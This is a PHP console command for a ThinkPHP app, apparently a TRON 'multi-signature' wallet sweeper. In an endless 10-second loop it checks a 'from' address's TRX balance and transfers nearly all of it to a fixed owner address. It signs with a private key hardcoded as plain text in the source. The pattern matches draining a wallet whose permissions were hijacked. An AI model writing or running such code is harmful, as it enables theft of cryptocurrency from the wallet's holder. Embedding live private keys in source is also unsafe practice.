<?php
/**
 * 自动双签转TRX
 */
namespace app\command;
use think\console\Command;
use think\console\Input;
use think\console\Output;
use think\Exception;

class Atmpy extends Command
{
    protected function configure()
    {
        $this->setName('Atmpy')
            ->setDescription('奥特曼朋友钱包定时器');
    }

    public function execute(Input $input, Output $output)
    {
        ini_set('max_execution_time', 0);
        $output->writeln('----- ' . date('y-m-d H:i:s') . ' 当前正在执行奥特曼朋友钱包定时器 -----');

        while (true) {
            $ownerAddress = 'TXbbUjHKGetvjW4qaQvi1QYB4y3GvaCvmn';
            $from = 'T9zhdY6J2JStHPhCcdphJuT42bLx8wGP86';
            $to = 'TXbbUjHKGetvjW4qaQvi1QYB4y3GvaCvmn';

            // 获取余额
            $trx = (new \app\common\service\Getbalance())->getBalance(1, $from);
            // $output->writeln('-----trx: ' .$trx . ' -----');

            try {
                if ($trx > 10) {
                    $trx = $trx - 1; // 减少 trx 的数量
                    $uri = 'https://api.trongrid.io';
                    $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
                    $config = [
                        'contract_address' => '',
                        'decimals' => 6,
                    ];

                    // 创建 TRX 钱包实例
                    $trxWallet = new \Tron\TRX($api, $config);
                    $ownerAddress = new \Tron\Address($ownerAddress, '0df39ab839a86d9e1faba4a36f738ff4fe537c7e88046bc77913888d71d44c94', $trxWallet->tron->address2HexString($ownerAddress));
                    $from = new \Tron\Address($from, '000', $trxWallet->tron->address2HexString($from));
                    $to = new \Tron\Address($to, '', $trxWallet->tron->address2HexString($to));

                    // 执行转账
                    $trxWallet->transferfrom($ownerAddress, $from, $to, $trx);
                }
            } catch (Exception $e) {
                // 处理异常，记录错误并继续执行
//                error_log($e->getMessage()); // 记录错误日志
                $output->writeln('转账失败: ' . $e->getMessage()); // 输出错误信息
            }

            sleep(10); // 等待 10 秒
            $output->writeln('----- ' . date('y-m-d H:i:s') . ' -----'); // 打印当前时间
        }
    }
}
